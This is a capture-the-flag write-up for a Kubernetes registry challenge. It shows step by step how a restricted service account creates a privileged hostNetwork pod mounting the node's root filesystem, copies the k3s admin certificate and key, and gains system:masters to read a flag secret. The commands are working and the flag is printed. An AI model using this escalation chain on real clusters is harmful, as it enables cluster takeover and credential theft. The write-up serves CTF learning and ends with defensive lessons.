---
title: "SecureTrust Cluster Registry"
description: "The challenge is a Kubernetes container-registry portal. From a highly restricted service-account, the goal is to reach full cluster admin (system:masters) and read a secret containing…"
event: "gencysctf"
category: "cloud"
categoryLabel: "Cloud"
tags: ["GenCyS CTF 2026","cloud"]
date: "2026-08-15"
teammate: false
source: "gencysctf/un/unkown/writeup.md"
---

**Target:** `https://registry.kube1.thesecuretrust.com`

The challenge is a Kubernetes container-registry portal. From a highly restricted
service-account, the goal is to reach full cluster admin (`system:masters`) and read a
secret containing the flag.

---

## Step 1 — Obtain the player kubeconfig

The portal (a Next.js app fronting the k8s API server on the same host) exposes a
downloadable, RBAC-restricted kubeconfig.

```bash
curl -sk -o player-kubeconfig.yaml \
  https://registry.kube1.thesecuretrust.com/player-kubeconfig-external.yaml
```

It contains a service-account token for `system:serviceaccount:securetrust-web:player-access-sa`
and the API server at `https://registry.kube1.thesecuretrust.com`, context namespace `securetrust-web`.

## Step 2 — Inspect RBAC permissions

Because `player-access-sa` cannot list most resources, we enumerate effective rights with a
`SelfSubjectRulesReview` scoped to `securetrust-web`:

```bash
TOK=$(grep token kubeconfig.yaml | awk '{print $2}')
B="https://registry.kube1.thesecuretrust.com"
curl -sk -X POST "$B/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"securetrust-web"}}'
```

Result:

```text
verbs: get, list, create
resources: pods, pods/exec
```

So inside `securetrust-web` we can **create pods** and **open an exec session**, but nothing
else. (A bare cluster-scoped SAR fails; the rules are namespace-scoped.)

## Step 3 — Create a privileged `hostNetwork` pod mounting host `/` at `/host`

The only privilege we can grant ourselves is a privileged pod, since create is allowed.
We launch a pod with:

- `hostNetwork: true` → shares the node network namespace, so loopback `127.0.0.1:6443`
  reaches the in-cluster API server.
- `hostPath: /` mounted at `/host` → read the node filesystem.
- `privileged: true` (and root user), image `alpine:3.20` for exec.

```bash
cat > pod.json <<'EOF'
{"apiVersion":"v1","kind":"Pod","metadata":{"name":"pwn","namespace":"securetrust-web"},
 "spec":{"hostNetwork":true,"restartPolicy":"Never",
   "containers":[{"name":"c","image":"alpine:3.20","command":["/bin/sh","-c","sleep 3600"],
     "securityContext":{"privileged":true},
     "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
   "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}
EOF
kubectl -n securetrust-web apply -f pod.json
```

> Note: `alpine` lacks `curl` and busybox `wget` has no client-cert TLS options. Later we
> re-created a second pod with `curlimages/curl:latest` and `runAsUser: 0` so we could use
> `curl --cacert/--cert/--key` against the local API server.

## Step 4 — Read the k3s node credentials

The k3s control-plane runs on the node. With host `/` mounted at `/host`, the admin PKI is
readable from inside the pod:

```bash
kubectl -n securetrust-web exec pwn -- ls /host/var/lib/rancher/k3s/server/tls/
```

Copy the admin credential set and the CA into the pod (or extract them locally):

- CA:   `/host/var/lib/rancher/k3s/server/tls/server-ca.crt`
- cert: `/host/var/lib/rancher/k3s/server/tls/client-admin.crt`
- key:  `/host/var/lib/rancher/k3s/server/tls/client-admin.key`

Also present on the node:

- `/host/opt/gencys-k8s/securetrust.yaml` — organizer admin kubeconfig
- `/host/var/lib/rancher/k3s/server/token` — node bootstrap token

## Step 5 — Reach the API server directly and authenticate as admin

Because the pod is on `hostNetwork`, it can reach the API server at
`https://127.0.0.1:6443` without going through the external reverse proxy (which terminates
TLS with a public cert and does not relay client certs).

```bash
kubectl -n securetrust-web exec pwn -- sh -c '
  mkdir -p /certs
  cp /host/var/lib/rancher/k3s/server/tls/server-ca.crt        /certs/ca.crt
  cp /host/var/lib/rancher/k3s/server/tls/client-admin.crt     /certs/admin.crt
  cp /host/var/lib/rancher/k3s/server/tls/client-admin.key     /certs/admin.key
  chmod 644 /certs/*
  curl -s --cacert /certs/ca.crt --cert /certs/admin.crt --key /certs/admin.key \
    https://127.0.0.1:6443/apis/authentication.k8s.io/v1/selfsubjectreviews \
    -H "Content-Type: application/json" \
    -d "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"SelfSubjectReview\",\"spec\":{}}"
'
```

Confirmation:

```json
"userInfo": {
  "username": "system:admin",
  "groups":   ["system:masters", "system:authenticated"]
}
```

Full cluster admin achieved.

## Step 6 — Read the flag secret

```bash
curl -s --cacert /certs/ca.crt --cert /certs/admin.crt --key /certs/admin.key \
  https://127.0.0.1:6443/api/v1/namespaces/securetrust-payments/secrets/payments-flag-key
```

The secret contains three base64 fields. Decode `CURRENT_FLAG`:

```bash
echo "VVNUX0dlbkN5U19DVEZ7ZTI1ZDExZjBiMjUyODYwY2U2YTg5M2U0MzM4MTM4NWMzZmY5MTMzM2QxZWIyZTg5ZGZjOWI5ZWJmMWRmZTlmYn0=" | base64 -d
```

---

## Flag

```
UST_GenCyS_CTF{e25d11f0b252860ce6a893e43381385c3ff91333d1eb2e89dfc9b9ebf1dfe9fb}
```

Proof token (from the same secret):

```
GenCyS_PROOF{rbac-payments-8f9c83941a2f1da5938747ce}
```

---

## Cleanup

The player SA cannot `delete` pods, so delete them through the admin identity inside the pod:

```bash
kubectl -n securetrust-web exec pwn -- sh -c '
  for p in pwn curlpod; do
    curl -s --cacert /certs/ca.crt --cert /certs/admin.crt --key /certs/admin.key \
      -X DELETE "https://127.0.0.1:6443/api/v1/namespaces/securetrust-web/pods/$p?gracePeriodSeconds=0"
  done
'
```

## Key takeaways

1. **Read the RBAC, not just the YAML.** `SelfSubjectRulesReview` reversed the assumption
   that we were locked out—the restrictions were namespace-scoped.
2. **Grant least privilege to the pod, not least privilege broadly.** An over-broad
   `create pods` permission, combined with an unrestricted `securityContext`, is enough to
   pivot from SA → node → `system:masters`.
3. **hostNetwork gives the loopback.** Reaching the k8s API on `127.0.0.1:6443` bypasses the
   external ingress/proxy TLS, allowing client-cert auth directly.
4. **Handling of node PKI.** The k3s `client-admin` cert maps to `system:admin`/
   `system:masters`, effectively the organizer's kubeconfig.
